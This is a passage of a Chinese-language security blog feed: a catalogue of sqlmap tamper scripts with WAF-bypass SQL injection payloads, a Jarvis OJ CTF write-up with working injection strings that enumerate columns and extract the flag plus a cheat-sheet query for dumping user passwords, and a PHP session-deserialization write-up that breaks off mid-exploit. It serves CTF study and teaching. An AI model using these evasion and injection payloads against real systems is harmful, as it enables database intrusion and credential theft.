title="htmlencode.py："></a>htmlencode.py：</h4><blockquote><p>return re.sub(r”<a href="http://www.myh0st.cn/index.php/archives/881/#fn-1" target="_blank" rel="noopener">1</a>“, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1’ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2) <strong>to</strong> if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT <strong>to</strong> union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1 <strong>to</strong></p><p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+ <strong>to</strong> UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1 <strong>to</strong> 1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote><p>retVal = “%s%ssp_password” % (payload, “– “ if not any(_ if <em>in payload else None for</em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+ <strong>to</strong> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py： union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+</p><p>space2morehash.py：union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote><p>retVal = re.sub(r”(?i)bANDb”, “%26%26”, re.sub(r”(?i)bORb”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p><p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1 <strong>to</strong> 1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p><blockquote><p>union select <strong>to</strong> UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;apostrophemask.py 用UTF-8全角字符替换单引号字符&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;apostrophenullencode.py 用非法双字节unicode字符替换单引号字符&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;appendnu
      
    
    </summary>
    
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ inject</title>
    <link href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/"/>
    <id>https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</id>
    <published>2019-02-26T09:56:10.000Z</published>
    <updated>2019-02-28T09:03:07.181Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><h3 id="得到源码"><a href="#得到源码" class="headerlink" title="得到源码"></a>得到源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?table=flag 正常响应<br>==&gt; <strong>存在 secret_flag 表</strong><br>注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符</p><p>本地尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure></p><p>结合题目 ==&gt; desc `secret_flag` `<br>（注意空格，此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）</p><p>顺手执行<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure></p><p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>==&gt; 1</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p> ==&gt; flagUwillNeverKnow<br>(此处 table_name 的值要进行 hex 编码）</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>==&gt; flag</p><blockquote><p>PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示我们的数据<br>如 ?table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p></blockquote><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><strong>information_schema</strong> 存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段），flag 要hex编码 0x666c6167</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=flag; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32794/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32794/index.php&lt;/a&gt;~&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ phpinfo</title>
    <link href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/"/>
    <id>https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/</id>
    <published>2019-02-25T12:42:29.000Z</published>
    <updated>2019-02-28T09:02:57.532Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">原题链接</a>下面是题目给出的源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>涉及到几个知识点</strong></p><p>1.<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></p><p>在设置 SESSION 和读取 SESSION 两个阶段中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'test'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">存储时使用 php_serialize ==&gt; </span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">反序列化使用 php ==&gt; </span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">[<span class="string">"a:1:&#123;s:4:"</span>test<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>PHP 获取 SESSION 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”，<br>并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，找到下一个竖线，执行同样的操作，<br>直到成功。</p><p>很明显有 <code>eval()</code>，但 <code>$mdzz</code> 好像不可控，那如何利用它执行我们想要的操作呢，这就需要用到下一个知识。<br><br><br>2.上传进度支持（Upload progress in sessions）</p><p>利用此工具可达到对 <code>session</code> 写入数据的效果，从而使得 <code>$mdzz</code> 可控，可参照 <a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的 php 反序列化总结</a></p><p>当一个上传在处理中，同时 <code>post</code>一个与 <code>ini</code> 设置的 <code>session.upload_progress.name</code> 同名变量时，<code>php</code> 检测到这种 <code>post</code>请求就会在 <code>$_SESSION</code> 中添加一组数据，所以可通过 <code>session.upload_progress</code> 来设置 <code>session</code>。</p><p>下面是部分参数说明</p><blockquote><p>session.upload_progress.enabled[=1] : 是否启用上传进度报告(默认开启)<br>session.upload_progress.cleanup[=1] : 是否在上传完成后及时删除进度数据(默认开启, 推荐开启).<br>session.upload_progress.prefix[=upload_progress_] : 进度数据将存储在<br>_SESSION[session.upload_progress.prefix . _POST[session.upload_progress.name]]<br>session.upload_progress.name[=PHP_SESSION_UPLOAD_PROGRESS] :<br>如果_POST[session.upload_progress.name]没有被设置, 则不会报告进度.<br>session.upload_progress.freq[=1%] : 更新进度的频率(已经处理的字节数), 也支持百分比表示’%’.<br>session.upload_progress.min_freq[=1.0] : 更新进度的时间间隔(秒级)</p></blockquote><p>回到本题，查看 phpinfo， <code>session.upload_progress.enabled</code> 打开，并且 <code>session.upload_progress.cleanup</code>关闭。</p><p>正常用法参见 <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">example #1</a>，配合 Ajax 就能显示上传进度</p><p>这里写一个表单<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>session form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span 